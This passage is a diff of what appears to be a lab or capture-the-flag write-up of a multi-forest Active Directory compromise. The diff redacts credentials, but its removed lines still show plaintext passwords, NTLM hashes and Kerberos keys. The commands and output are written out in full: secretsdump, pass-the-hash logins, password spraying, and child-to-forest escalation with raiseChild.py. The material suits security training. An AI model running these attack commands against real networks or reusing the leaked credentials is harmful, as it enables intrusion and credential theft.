+Administrator:500:<redacted>:<redacted>:::
 [*] Kerberos keys grabbed
-Administrator:0x14:e9ba9b3fd43b9784687a55836ea3c9a957a113a5f1843c5c23b83681865ccbe9
-Administrator:0x13:855963cab84742931bda6c1418ca88e2
-Administrator:aes256-cts-hmac-sha1-96:db6b27832717396b599680395ab8612500f20371c256f4ccd5b0ed005a172f25
-Administrator:aes128-cts-hmac-sha1-96:4ddf65705fc442d1a9bcfe02e91024f3
-Administrator:0x17:c093cbd6000fa289a92b412131a4cefa
+Administrator:0x14:<redacted>
+Administrator:0x13:<redacted>
+Administrator:aes256-cts-hmac-sha1-96:<redacted>
+Administrator:aes128-cts-hmac-sha1-96:<redacted>
+Administrator:0x17:<redacted>
 [*] Cleaning up...
 Exegol ➜ /workspace/
 ```
@@ -2129,7 +2129,7 @@ Exegol ➜ /workspace/
 Now we can grab the flag:
 
 ```zsh
-Exegol ➜ /workspace/killshot 𝘹 evil-winrm -i 10.10.10.136 -u 'Administrator' -H 'c093cbd6000fa289a92b412131a4cefa'
+Exegol ➜ /workspace/killshot 𝘹 evil-winrm -i 10.10.10.136 -u 'Administrator' -H '<redacted>'
 
 Evil-WinRM shell v3.9
 
@@ -2173,7 +2173,7 @@ Running `strings` against the binary for a few things that we have seen common w
 Exegol ➜ /workspace/killshot 𝘹 strings ldap_sync.exe | grep !
 !This program cannot be run in DOS mode.
 ~!Ic
-D@rkhav3nLDAP2024!
+<redacted>
 !_initterm
 !__mingw_setusermatherr
 !__set_app_type
@@ -2219,7 +2219,7 @@ Looking into the password that was identified:
 486-H[^_]
 487-dc.ext.darkhaven.local
 488-ldap_svc
-489:D@rkhav3nLDAP2024!
+489:<redacted>
 490-DC=ext,DC=darkhaven,DC=local
 491-DC=darkhaven,DC=tech
 492-DarkHavenLDAPSync
@@ -2250,7 +2250,7 @@ We see another password for `ldap_svc`:
 
 ```
 488-ldap_svc
-489:D@rkhav3nLDAP2024!
+489:<redacted>
 ```
 
 > **Teaching Moment — Compiled Secrets Are Still Secrets:** Developers sometimes assume that embedding a credential inside a compiled binary is "obfuscation" — it is not. String tables survive compilation, and the surrounding strings (`dc.ext.darkhaven.local`, `DC=darkhaven,DC=tech`, `LDAP bind successful`) gave us the exact context for how the discovered password was used. A simple `strings | grep !` cracked the binary in one second.
@@ -2262,9 +2262,9 @@ We see another password for `ldap_svc`:
 ## dc01 (corp.darkhaven.tech)
 
 ```zsh
-Exegol ➜ /workspace/killshot 𝘹 nxc smb 10.10.10.5 -u ldap_svc -p 'D@rkhav3nLDAP2024!'
+Exegol ➜ /workspace/killshot 𝘹 nxc smb 10.10.10.5 -u ldap_svc -p '<redacted>'
 SMB         10.10.10.5      445    EC2AMAZ-KK0CT8N  [*] Windows 11 / Server 2025 Build 26100 x64 (name:EC2AMAZ-KK0CT8N) (domain:corp.darkhaven.tech) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         10.10.10.5      445    EC2AMAZ-KK0CT8N  [+] corp.darkhaven.tech\ldap_svc:D@rkhav3nLDAP2024! (admin)
+SMB         10.10.10.5      445    EC2AMAZ-KK0CT8N  [+] corp.darkhaven.tech\ldap_svc:<redacted> (admin)
 ```
 
 We can request another TGT and conduct a secretsdump on DC01:
@@ -2278,56 +2278,56 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 
 [*] Service RemoteRegistry is in stopped state
 [*] Starting service RemoteRegistry
-[*] Target system bootKey: 0xa73ae9334788c4bd80e5a1086b4254cc
+[*] Target system bootKey: <redacted>
 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b0affe5ce1e9b1d15c963eacbf95298:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Administrator:500:<redacted>:<redacted>:::
+Guest:501:<redacted>:<redacted>:::
+DefaultAccount:503:<redacted>:<redacted>:::
 [-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
 [*] Dumping cached domain logon information (domain/username:hash)
 [*] Dumping LSA Secrets
 [*] $MACHINE.ACC
-CORP\EC2AMAZ-KK0CT8N$:plain_password_hex:300031003d007300750068007300310051007a00670069007500320033006300620057004400700041006c00550078004b007600510056005a006700480043006d0053002b0032003d00700070006400540041007500650054004700370058004f00360061005300710075006e006a0063006d00510034006d0035004e00460032004e0061007a0062004d0065006300520036005
-CORP\EC2AMAZ-KK0CT8N$:aad3b435b51404eeaad3b435b51404ee:6ea20025ea22e89c81647a2bb0b84387:::
+CORP\EC2AMAZ-KK0CT8N$:plain_password_hex:<redacted>
+CORP\EC2AMAZ-KK0CT8N$:<redacted>:<redacted>:::
 [*] DPAPI_SYSTEM
-dpapi_machinekey:0x0f3b9ac6dff861ae1acf2429cc28e5d205fdde09
-dpapi_userkey:0x3bfc4e9030e5b3c88749202d71466cb5079a834c
+dpapi_machinekey:<redacted>
+dpapi_userkey:<redacted>
 [*] NL$KM
  0000   D6 F9 1E BE 20 95 21 6A  88 22 1F 5C 92 CE 2C 8A   .... .!j.".\..,.
  0010   BB CF 2C 38 59 53 A4 3A  EF A0 03 DA EA A5 A8 CF   ..,8YS.:........
  0020   0E 6F 91 92 02 3E 5B 45  40 E2 C7 A8 D5 DA 8B 11   .o...>[E@.......
  0030   6D 77 6B 5F 3F 78 48 12  0F BF A8 CE 06 C2 C6 7C   mwk_?xH........|
-NL$KM:d6f91ebe2095216a88221f5c92ce2c8abbcf2c385953a43aefa003daeaa5a8cf0e6f9192023e5b4540e2c7a8d5da8b116d776b5f3f7848120fbfa8ce06c2c67c
+NL$KM:<redacted>
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:7b941d50b17fd85403bd16467c4c9743:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ac1f5ff2bd2333709b990dadc2530bbf:::
-corp.darkhaven.tech\ldap_svc:1109:aad3b435b51404eeaad3b435b51404ee:8922a7a192311abe3fecea53bb8154a7:::
-corp.darkhaven.tech\sql_svc:1110:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-corp.darkhaven.tech\svc_backup:1111:aad3b435b51404eeaad3b435b51404ee:eabb422d6f4a21d47f2652b4f7aab388:::
-corp.darkhaven.tech\svc_monitoring:1112:aad3b435b51404eeaad3b435b51404ee:e6be195146b923d723318ed44f121b8d:::
-corp.darkhaven.tech\svc_sccm:1113:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-corp.darkhaven.tech\svc_sql:1114:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-corp.darkhaven.tech\svc_webpool:1115:aad3b435b51404eeaad3b435b51404ee:2116fad6c23ff41723df1f6f8446fa34:::
-corp.darkhaven.tech\abarnes:1116:aad3b435b51404eeaad3b435b51404ee:c97b3854a773e9e841d5b61d6af81e41:::
+Administrator:500:<redacted>:<redacted>:::
+Guest:501:<redacted>:<redacted>:::
+krbtgt:502:<redacted>:<redacted>:::
+corp.darkhaven.tech\ldap_svc:1109:<redacted>:<redacted>:::
+corp.darkhaven.tech\sql_svc:1110:<redacted>:<redacted>:::
+corp.darkhaven.tech\svc_backup:1111:<redacted>:<redacted>:::
+corp.darkhaven.tech\svc_monitoring:1112:<redacted>:<redacted>:::
+corp.darkhaven.tech\svc_sccm:1113:<redacted>:<redacted>:::
+corp.darkhaven.tech\svc_sql:1114:<redacted>:<redacted>:::
+corp.darkhaven.tech\svc_webpool:1115:<redacted>:<redacted>:::
+corp.darkhaven.tech\abarnes:1116:<redacted>:<redacted>:::
 ```
 
 We can capture the flag with a single command to keep it simple, flag is not shown in the writeup:
 
 ```zsh
-Exegol ➜ /workspace/killshot 𝘹 nxc winrm 10.10.10.5 -u administrator -H 7b941d50b17fd85403bd16467c4c9743 -x 'type C:\Users\Administrator\Desktop\root.txt'
+Exegol ➜ /workspace/killshot 𝘹 nxc winrm 10.10.10.5 -u administrator -H <redacted> -x 'type C:\Users\Administrator\Desktop\root.txt'
 /root/.pyenv/versions/3.11.14/lib/python3.11/site-packages/requests/__init__.py:113: RequestsDependencyWarning: urllib3 (2.6.3) or chardet (6.0.0.post1)/charset_normalizer (3.4.4) doesn't match a supported version!
   warnings.warn(
 WINRM       10.10.10.5      5985   EC2AMAZ-KK0CT8N  [*] Windows 11 / Server 2025 Build 26100 (name:EC2AMAZ-KK0CT8N) (domain:corp.darkhaven.tech)
-WINRM       10.10.10.5      5985   EC2AMAZ-KK0CT8N  [+] corp.darkhaven.tech\administrator:7b941d50b17fd85403bd16467c4c9743 (admin)
+WINRM       10.10.10.5      5985   EC2AMAZ-KK0CT8N  [+] corp.darkhaven.tech\administrator:<redacted> (admin)
 WINRM       10.10.10.5      5985   EC2AMAZ-KK0CT8N  [+] Executed command (shell type: cmd)
 ```
 
 ## Enumerate Trusts
 
 ```
-Exegol ➜ /workspace/killshot 𝘹 bloodyAD -u ldap_svc -p 'D@rkhav3nLDAP2024!' -d corp.darkhaven.tech --host 10.10.10.5 get trusts
+Exegol ➜ /workspace/killshot 𝘹 bloodyAD -u ldap_svc -p '<redacted>' -d corp.darkhaven.tech --host 10.10.10.5 get trusts
 corp.darkhaven.tech
  +-- <WITHIN_FOREST|AD>:darkhaven.tech
 ```
@@ -2344,7 +2344,7 @@ We can use `raiseChild.py`:
 
 ```zsh
 Exegol ➜ /workspace/killshot 𝘹 raiseChild.py -target-exec 10.10.10.4 \
-    corp.darkhaven.tech/ldap_svc:'D@rkhav3nLDAP2024!'
+    corp.darkhaven.tech/ldap_svc:'<redacted>'
 Impacket v0.11.0 - Copyright 2023 Fortra
 
 [*] Raising child domain corp.darkhaven.tech
@@ -2352,14 +2352,14 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 [*] Raising corp.darkhaven.tech to darkhaven.tech
 [*] darkhaven.tech Enterprise Admin SID is: S-1-5-21-1874561643-3508613807-996616505-519
 [*] Getting credentials for corp.darkhaven.tech
-corp.darkhaven.tech/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ac1f5ff2bd2333709b990dadc2530bbf:::
-corp.darkhaven.tech/krbtgt:aes256-cts-hmac-sha1-96s:5e5f596d663bd83e970e6d95a2700c79bf290567b12a9148e770994071ec5d80
+corp.darkhaven.tech/krbtgt:502:<redacted>:<redacted>:::
+corp.darkhaven.tech/krbtgt:aes256-cts-hmac-sha1-96s:<redacted>
 [*] Getting credentials for darkhaven.tech
-darkhaven.tech/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:58c32f4ff3286090889837fe9619147a:::
-darkhaven.tech/krbtgt:aes256-cts-hmac-sha1-96s:4b46aefa864315912f4ab7c27cb0d28652c841828bb0ad92d3a8c6b43c93be47
+darkhaven.tech/krbtgt:502:<redacted>:<redacted>:::
+darkhaven.tech/krbtgt:aes256-cts-hmac-sha1-96s:<redacted>
 [*] Target User account name is Administrator
-darkhaven.tech/Administrator:500:aad3b435b51404eeaad3b435b51404ee:b38a41e844c5c3d706c1e9e575f3e62c:::
-darkhaven.tech/Administrator:aes256-cts-hmac-sha1-96s:3956c7969b120f4c636a8d0e97044fa574ee0ffbcb122903cf0e1ee325134ceb
+darkhaven.tech/Administrator:500:<redacted>:<redacted>:::
+darkhaven.tech/Administrator:aes256-cts-hmac-sha1-96s:<redacted>
 [*] Opening PSEXEC shell at DC.darkhaven.tech
 [-] Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type)
 ```
@@ -2369,7 +2369,7 @@ darkhaven.tech/Administrator:aes256-cts-hmac-sha1-96s:3956c7969b120f4c636a8d0e97
 Now get a TGT and do secretsdump:
 
 ```
-Exegol ➜ /workspace/killshot 𝘹 getTGT.py -aesKey 3956c7969b120f4c636a8d0e97044fa574ee0ffbcb122903cf0e1ee325134ceb \
+Exegol ➜ /workspace/killshot 𝘹 getTGT.py -aesKey <redacted> \
     darkhaven.tech/Administrator -dc-ip 10.10.10.4
 Impacket v0.11.0 - Copyright 2023 Fortra
 
@@ -2383,39 +2383,39 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:b38a41e844c5c3d706c1e9e575f3e62c:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:58c32f4ff3286090889837fe9619147a:::
-DC$:1000:aad3b435b51404eeaad3b435b51404ee:debed9627b253b4c677d6045d39a6873:::
-CORP$:1103:aad3b435b51404eeaad3b435b51404ee:f3d04839876006671af0e62c8999917f:::
+Administrator:500:<redacted>:<redacted>:::
+Guest:501:<redacted>:<redacted>:::
+krbtgt:502:<redacted>:<redacted>:::
+DC$:1000:<redacted>:<redacted>:::
+CORP$:1103:<redacted>:<redacted>:::
 [*] Kerberos keys grabbed
-Administrator:0x14:eb1eb1b68074a0aa1071f0ebbb3b755ee0e89259d1dff3c261bef8bf3958369f
-Administrator:0x13:d7acbfa9cb94cff03e48f1aed703b520
-Administrator:aes256-cts-hmac-sha1-96:3956c7969b120f4c636a8d0e97044fa574ee0ffbcb122903cf0e1ee325134ceb
-Administrator:aes128-cts-hmac-sha1-96:e04830438e7ecf52303b867bd0d4d906
-Administrator:0x17:b38a41e844c5c3d706c1e9e575f3e62c
-krbtgt:aes256-cts-hmac-sha1-96:4b46aefa864315912f4ab7c27cb0d28652c841828bb0ad92d3a8c6b43c93be47
-krbtgt:aes128-cts-hmac-sha1-96:6972a98be4221271f86bc010bd75a75f
-krbtgt:0x17:58c32f4ff3286090889837fe9619147a
-DC$:0x14:00236f00a59b60dba440bf8c7ca27366b301196a03868ce7663ebd915dd82d22
-DC$:0x13:2ed8725a0cf3298161770b2598877038
-DC$:aes256-cts-hmac-sha1-96:6fec4fac8a46156c1c7ccdb7074327cb669c914c09602ea8daeac4789fce1387
-DC$:aes128-cts-hmac-sha1-96:7390089e12b3f1baea0df6fdce4654d0
-DC$:0x17:debed9627b253b4c677d6045d39a6873
-CORP$:aes256-cts-hmac-sha1-96:19cc35c87fe0c96c98da89fcda0e6010c82b92c76a93fa1fe82921356e1e1a4b
-CORP$:aes128-cts-hmac-sha1-96:ce1516a98ba2e83868525ada0cfff20e
-CORP$:0x17:f3d04839876006671af0e62c8999917f
+Administrator:0x14:<redacted>
+Administrator:0x13:<redacted>
+Administrator:aes256-cts-hmac-sha1-96:<redacted>
+Administrator:aes128-cts-hmac-sha1-96:<redacted>
+Administrator:0x17:<redacted>
+krbtgt:aes256-cts-hmac-sha1-96:<redacted>
+krbtgt:aes128-cts-hmac-sha1-96:<redacted>
+krbtgt:0x17:<redacted>
+DC$:0x14:<redacted>
+DC$:0x13:<redacted>
+DC$:aes256-cts-hmac-sha1-96:<redacted>
+DC$:aes128-cts-hmac-sha1-96:<redacted>
+DC$:0x17:<redacted>
+CORP$:aes256-cts-hmac-sha1-96:<redacted>
+CORP$:aes128-cts-hmac-sha1-96:<redacted>
+CORP$:0x17:<redacted>
 [*] Cleaning up...
 ```
 
 Capturing the final flag:
 
 ```
-Exegol ➜ /workspace/killshot 𝘹 nxc winrm 10.10.10.4 -u administrator -H b38a41e844c5c3d706c1e9e575f3e62c -x 'type C:\Users\Administrator\Desktop\root.txt'
+Exegol ➜ /workspace/killshot 𝘹 nxc winrm 10.10.10.4 -u administrator -H <redacted> -x 'type C:\Users\Administrator\Desktop\root.txt'
 /root/.pyenv/versions/3.11.14/lib/python3.11/site-packages/requests/__init__.py:113: RequestsDependencyWarning: urllib3 (2.6.3) or chardet (6.0.0.post1)/charset_normalizer (3.4.4) doesn't match a supported version!
   warnings.warn(
 WINRM       10.10.10.4      5985   DC               [*] Windows 11 / Server 2025 Build 26100 (name:DC) (domain:darkhaven.tech)
-WINRM       10.10.10.4      5985   DC               [+] darkhaven.tech\administrator:b38a41e844c5c3d706c1e9e575f3e62c (admin)
+WINRM       10.10.10.4      5985   DC               [+] darkhaven.tech\administrator:<redacted> (admin)
 ```
 
 Full multi-forest compromise achieved — every forest, every domain, every host under our control.
@@ -2427,44 +2427,44 @@ Full multi-forest compromise achieved — every forest, every domain, every host
 ```
 Phase 2 - Initial Access (Web Portal)
 ────────────────────────────────────────────────────────────────
-sql_svc          : SqLS3rvic3!               → Help Desk default (web portal)
+sql_svc          : <redacted>               → Help Desk default (web portal)
 
 Phase 3 - MSSQL & KeePass Recovery
 ────────────────────────────────────────────────────────────────
-showard          : 5rtfgvb^RTFGVB            → KeePass (stored_passwords\it_passwords.kdbx)
+showard          : <redacted>            → KeePass (stored_passwords\it_passwords.kdbx)
 
 Phase 4 - Password Spray & CA Compromise
 ────────────────────────────────────────────────────────────────
-kwarren          : Welcome1@DarkH4ven        → Default onboarding password
-twells           : Welcome1@DarkH4ven        → Default onboarding password
-ichambers        : Welcome1@DarkH4ven        → Default onboarding password (LOCAL ADMIN on CA)
-CA\Administrator : [NTLM PTH 7af69f42...]    → secretsdump (local SAM via ichambers)
+kwarren          : <redacted>        → Default onboarding password
+twells           : <redacted>        → Default onboarding password
+ichambers        : <redacted>        → Default onboarding password (LOCAL ADMIN on CA)
+CA\Administrator : [NTLM PTH <redacted>]     → secretsdump (local SAM via ichambers)
 
 Phase 5 - SHARE Host to svc_webpool
 ────────────────────────────────────────────────────────────────
-svc_netops       : N3t0ps$Svc_2024!          → Runbook (Network_Infrastructure_Runbook_v3.txt)
-svc_webpool      : D@rkH@v3n128!             → Inveigh NTLMv2 + hashcat (it_security_wordlist.txt)
+svc_netops       : <redacted>          → Runbook (Network_Infrastructure_Runbook_v3.txt)
+svc_webpool      : <redacted>             → Inveigh NTLMv2 + hashcat (it_security_wordlist.txt)
 
 Phase 6 - Web Server & Domain Foothold
 ────────────────────────────────────────────────────────────────
-kwarren          : !@#darkhav3n123#@!        → Notepad++ backup (maint_config.php)
+kwarren          : <redacted>        → Notepad++ backup (maint_config.php)
 
 Phase 7 - DC.ext Compromise
 ────────────────────────────────────────────────────────────────
-ca_svc_account$  : [NTLM PTH 3ab7add8...]    → ReadGMSAPassword via kwarren
-ldap_svc         : 6trfgvb**hs#@jskKFHJAh34  → PowerShell history (ConsoleHost_history.txt)
-EXT\Administrator: [NTLM PTH c093cbd6...]    → DCSync via ldap_svc
+ca_svc_account$  : [NTLM PTH <redacted>]     → ReadGMSAPassword via kwarren
+ldap_svc         : <redacted>  → PowerShell history (ConsoleHost_history.txt)
+EXT\Administrator: [NTLM PTH <redacted>]     → DCSync via ldap_svc
 
 Phase 8 - Cross-Forest Pivot
 ────────────────────────────────────────────────────────────────
-ldap_svc (corp)  : D@rkhav3nLDAP2024!        → strings ldap_sync.exe
-CORP\Administrator: [NTLM PTH 7b941d50...]   → secretsdump on EC2AMAZ-KK0CT8N
-CORP\krbtgt      : [NTLM ac1f5ff2...]        → secretsdump
+ldap_svc (corp)  : <redacted>        → strings ldap_sync.exe
+CORP\Administrator: [NTLM PTH <redacted>]    → secretsdump on EC2AMAZ-KK0CT8N
+CORP\krbtgt      : [NTLM <redacted>]         → secretsdump
 
 Phase 9 - Forest Root Compromise
 ────────────────────────────────────────────────────────────────
-DARKHAVEN.TECH\krbtgt        : [NTLM 58c32f4f... / AES256 4b46aefa...] → raiseChild.py
-DARKHAVEN.TECH\Administrator : [NTLM b38a41e8... / AES256 3956c796...] → raiseChild.py
+DARKHAVEN.TECH\krbtgt        : [NTLM <redacted> / AES256 <redacted>] → raiseChild.py
+DARKHAVEN.TECH\Administrator : [NTLM <redacted> / AES256 <redacted>] → raiseChild.py
 ```
 
 ---
